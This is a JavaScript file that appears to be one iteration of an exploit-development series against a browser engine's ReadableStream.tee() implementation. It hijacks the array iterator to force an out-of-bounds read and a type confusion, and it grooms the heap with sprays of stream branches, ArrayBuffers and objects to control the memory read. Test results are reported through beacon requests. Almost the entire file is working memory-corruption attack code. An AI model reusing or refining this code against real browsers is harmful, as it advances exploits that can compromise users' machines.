/*
 * p433 -- Groomed tee() OOB: control what results[1] reads
 *
 * V432-E confirmed crash on ungroomed OOB.
 *
 * CRITICAL INSIGHT from C++ audit: Strong<JSObject> stores HandleSlot
 * (JSValue*), NOT direct JSObject*. The OOB is a DOUBLE DEREFERENCE:
 *   1. Read 8 bytes at results[1] -> treated as HandleSlot (JSValue*)
 *   2. Dereference HandleSlot -> get JSValue
 *   3. JSValue.asCell() -> JSObject*
 *   4. fromObject() wraps the JSObject
 *
 * So adjacent memory must contain a valid HandleSlot pointer (pointing
 * into HandleSet's node array) to survive the deref chain.
 *
 * Strategy: spray normal tee() calls which create Strong<JSObject> via
 * HandleSet. HandleSlot values (pointers into HandleSet) end up in
 * Vector<Strong<JSObject>> allocations. If our OOB Vector lands next to
 * another Vector's data, results[1] reads a real HandleSlot.
 *
 * Tests:
 *   A: Spray tee branches (fill heap with HandleSlot-containing Vectors)
 *   B: Spray ArrayBuffers (Gigacage disabled, same heap)
 *   C: Spray plain objects
 *   D: Heavy mixed spray + multiple OOB attempts
 *   E: Response body consumption on substituted stream (bypass JS builtins?)
 *
 * Beacon prefix: V433-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V433-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// Helper: do an intercepted tee that returns 1 element (OOB read)
function teeOOB() {
  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("x");
      controller.close();
    }
  });

  var intercepted = false;
  var result = null;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        var items = [self[0]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    if (branches[1]) {
      result = {
        success: true,
        type: typeof branches[1],
        ctor: branches[1].constructor ? branches[1].constructor.name : "?",
        isRS: branches[1] instanceof ReadableStream
      };
      // Try to probe it
      try { result.locked = branches[1].locked; } catch(e) { result.lockErr = e.message.slice(0, 40); }
      result.branch = branches[1];
    } else {
      result = {success: false, branch1: "null/undefined"};
    }
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    result = {success: false, error: e.message.slice(0, 60)};
  }

  return result;
}

// Helper: do a substitution tee (return our object as branch2)
function teeSub(fakeObj) {
  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("x");
      controller.close();
    }
  });

  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        var items = [self[0], fakeObj];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return branches;
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return null;
  }
}

// ================================================================
// Test A: Spray tee branches to fill heap with InternalReadableStream ptrs
// Then do OOB tee -- hope results[1] reads a stale/adjacent IRS pointer
// ================================================================

function testA() {
  B("A-START");

  // Phase 1: Create 200 normal tee() calls to fill heap with IRS objects
  var allBranches = [];
  for (var i = 0; i < 200; i++) {
    try {
      var rs = new ReadableStream({
        start: function(controller) { controller.close(); }
      });
      var b = rs.tee();
      allBranches.push(b);
    } catch(e) { break; }
  }
  B("A-SPRAY", allBranches.length);

  // Phase 2: Release half of them (odd indices) to create holes
  for (var i = 1; i < allBranches.length; i += 2) {
    allBranches[i] = null;
  }

  // Phase 3: Try OOB tee
  var res = teeOOB();
  B("A-RESULT", res.success ? {
    success: true, ctor: res.ctor, isRS: res.isRS, locked: res.locked
  } : {
    success: false, error: res.error || res.branch1
  });
}

// ================================================================
// Test B: Spray ArrayBuffers (same heap, Gigacage disabled) then OOB
// AB JSCells are valid JSObjects -- if results[1] points to one, it wraps
// ================================================================

function testB() {
  B("B-START");

  // Spray 2000 small ArrayBuffers
  var abs = [];
  for (var i = 0; i < 2000; i++) {
    var ab = new ArrayBuffer(16); // small, same size class region
    new Uint32Array(ab)[0] = 0xBB000000 + i;
    abs.push(ab);
  }
  B("B-SPRAY", abs.length);

  // Try OOB
  var res = teeOOB();
  B("B-RESULT", res.success ? {
    success: true, ctor: res.ctor, isRS: res.isRS
  } : {
    success: false, error: res.error || res.branch1
  });

  // If success, try to interact
  if (res.success && res.branch) {
    try {
      // The OOB branch wraps whatever was adjacent in heap
      // If it's an ArrayBuffer JSCell, .locked reads from its C++ fields
      B("B-PROBE-LOCKED", res.branch.locked);
    } catch(e) {
      B("B-PROBE-ERR", e.message.slice(0, 60));
    }
  }

  // Keep spray alive
  B("B-ALIVE", abs[0].byteLength);
}

// ================================================================
// Test C: Spray small plain objects then OOB
// ================================================================

function testC() {
  B("C-START");

  var objs = [];
  for (var i = 0; i < 3000; i++) {
    objs.push({_m: i, _v: 0xCC000000 + i});
  }
  B("C-SPRAY", objs.length);

  var res = teeOOB();
  B("C-RESULT", res.success ? {
    success: true, ctor: res.ctor, isRS: res.isRS
  } : {
    success: false, error: res.error || res.branch1
  });

  if (res.success && res.branch) {
    try {
      B("C-PROBE", {
        locked: res.branch.locked,
        ctor: res.branch.constructor.name
      });
    } catch(e) {
      B("C-PROBE-ERR", e.message.slice(0, 60));
    }
  }

  B("C-ALIVE", objs.length);
}

// ================================================================
// Test D: Heavy spray + multiple OOB attempts
// Best-effort: try 5 times, report each result
// ================================================================

function testD() {
  B("D-START");

  // Heavy mixed spray
  var spray = [];
  for (var i = 0; i < 1000; i++) {
    spray.push(new ArrayBuffer(8));
    spray.push({_x: i});
    // Create ReadableStreams too (these have IRS objects in them)
    try {
      var rs = new ReadableStream({ start: function(c) { c.close(); } });
      spray.push(rs);
    } catch(e) {}
  }
  B("D-SPRAY", spray.length);

  // Try OOB 5 times
  for (var attempt = 0; attempt < 5; attempt++) {
    var res = teeOOB();
    if (res.success) {
      B("D-HIT-" + attempt, {ctor: res.ctor, isRS: res.isRS, locked: res.locked});

      // If we got a ReadableStream, try to figure out what object it wraps
      if (res.branch) {
        try {
          var keys = Object.getOwnPropertyNames(res.branch);
          B("D-KEYS-" + attempt, keys.slice(0, 10));
        } catch(e) {
          B("D-KEYS-ERR-" + attempt, e.message.slice(0, 40));
        }
      }
    } else {
      B("D-MISS-" + attempt, res.error || "crash/null");
      break; // If one crashes, no point continuing
    }
  }

  B("D-ALIVE", spray.length);
}

// ================================================================
// Test E: Use substitution to pass a Response body stream's internal
// as the fake branch -- see if C++ reads from it differently
// ================================================================

function testE() {
  B("E-START");

  // Create a confused ReadableStream via substitution (not OOB)
  // Pass an ArrayBuffer as the fake internal stream
  var targetAB = new ArrayBuffer(128);
  var view = new Uint32Array(targetAB);
  for (var i = 0; i < view.length; i++) {
    view[i] = 0xEE000000 + i;
  }

  var branches = teeSub(targetAB);
  if (!branches) {
    B("E-TEE-FAIL");
    return;
  }

  B("E-TEE-OK", {
    len: branches.length,
    type1: branches[1] ? branches[1].constructor.name : "null"
  });

  // branches[1] is a ReadableStream wrapping our ArrayBuffer as internal
  // Try creating a Response from it
  if (branches[1]) {
    try {
      var resp = new Response(branches[1]);
      B("E-RESPONSE-OK", {
        type: resp.type,
        status: resp.status,
        bodyUsed: resp.bodyUsed
      });

      // Reading response body goes through DIFFERENT code path than getReader()
      resp.text().then(function(text) {
        B("E-TEXT", {len: text.length, start: text.slice(0, 40)});
      }).catch(function(e) {
        B("E-TEXT-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("E-RESPONSE-ERR", e.message.slice(0, 60));
    }
  }

  // Also try: create a Blob from the confused stream
  // Blob constructor doesn't take ReadableStream, but we can try Response.blob()
  if (branches[1]) {
    try {
      var resp2 = new Response(branches[1]);
      resp2.arrayBuffer().then(function(ab) {
        B("E-AB", {len: ab.byteLength, first4: new Uint32Array(ab.slice(0, 16))});
      }).catch(function(e) {
        B("E-AB-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("E-AB-EXCEPT", e.message.slice(0, 60));
    }
  }

  setTimeout(function() { B("E-DONE"); }, 1000);
}

testA();
setTimeout(function() { testB(); }, 400);
setTimeout(function() { testC(); }, 800);
setTimeout(function() { testD(); }, 1200);
setTimeout(function() { testE(); }, 2000);
setTimeout(function() { B("DONE"); }, 4000);
})();
